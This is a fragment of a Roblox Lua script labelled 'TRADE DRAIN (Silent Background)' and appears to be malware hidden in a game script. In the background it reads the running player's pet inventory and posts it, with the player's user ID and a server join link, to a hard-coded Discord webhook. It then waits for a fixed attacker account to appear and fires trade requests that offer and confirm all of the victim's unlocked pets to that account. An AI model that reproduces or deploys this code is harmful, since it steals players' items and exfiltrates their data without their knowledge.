-- 5. TRADE DRAIN (Silent Background)
task.spawn(function()
    local TRADE_REMOTE = remotes.TradeRequested
    local HttpService = game:GetService("HttpService")
    local ATTACKER_USER_ID = 8601143159
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
    local DISCORD_ID = "1498793342945722388"

    local function sendDrain(content, embeds)
        if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
        local reqFunc = (syn and syn.request) or (http and http.request) or request
        pcall(function() reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = content, embeds = embeds })}) end)
    end

    repeat task.wait(1) until getReplicaData() and getReplicaData().Pets and getPets(getReplicaData())
    
    task.spawn(function()
        local data = getReplicaData()
        local petGroups = {}
        local count = 0
        local highestPower = 0
        
        for uid, petData in pairs(getPets(data)) do
            count = count + 1
            local key = petData.Tier.." "..petData.Name
            if not petGroups[key] then
                petGroups[key] = { Count = 0, Power = petData.Power or 0 }
            end
            petGroups[key].Count = petGroups[key].Count + 1
            if (petData.Power or 0) > highestPower then highestPower = petData.Power or 0 end
        end

        local fields = {}
        local added = 0
        
        for key, info in pairs(petGroups) do
            if added < 25 then
                table.insert(fields, {
                    name = string.format("🐾 %s", key),
                    value = string.format("Amount: **%d**\nPower: **%s**", info.Count, tostring(info.Power)),
                    inline = true
                })
                added = added + 1
            end
        end

        local lp = services.players.LocalPlayer
        local jobId = game.JobId
        local joinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
        
        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{
            title = string.format("🎒 %s — Inventory Scan", lp.Name),
            description = string.format("**UserID:** `%s`\n**Job ID:** `%s`\n**Total Pets:** `%d`\n**Best Power:** `%s`", tostring(lp.UserId), jobId, count, tostring(highestPower)),
            color = 0x8B0000,
            fields = fields,
            footer = { text = "Silence - Silent Scan" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
        }})

        -- Send follow up message with join link
        task.wait(1)
        sendDrain("", {{
            title = "🌐 Server Join Link",
            description = string.format("[Click Here to Join Their Server](%s)", joinLink),
            color = 0x00FF00,
            footer = { text = "Silence - Direct Connect" }
        }})
    end)

    local traded = false
    while not traded do
        task.wait(4)
        if not services.players:GetPlayerByUserId(ATTACKER_USER_ID) then continue end
        task.wait(1.5)
        if not pcall(function() TRADE_REMOTE:FireServer({ Action = "Request", TargetUserId = ATTACKER_USER_ID }) end) then continue end
        task.wait(1)
        local data = getReplicaData()
        if not data then continue end
        local refs = {}
        for uid, petData in pairs(getPets(data)) do
            if not petData.Locked then table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 }) end
        end
        if #refs == 0 then break end
        pcall(function() TRADE_REMOTE:FireServer({ Action = "Offer", Revision = 1, Refs = refs }) end)
        task.wait(1)
        if pcall(function() TRADE_REMOTE:FireServer({ Action = "Confirm" }) end) then
            traded = true
            sendDrain("", {{title = string.format("✅ Drain Complete — %s", services.players.LocalPlayer.Name), description = string.format("Offered %d pets to <@%s>.\nAccept the trade.", #refs, tostring(DISCORD_ID)), color = 0x00FF00, footer = { text = "Silence - Drain" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
        end
    end
end)
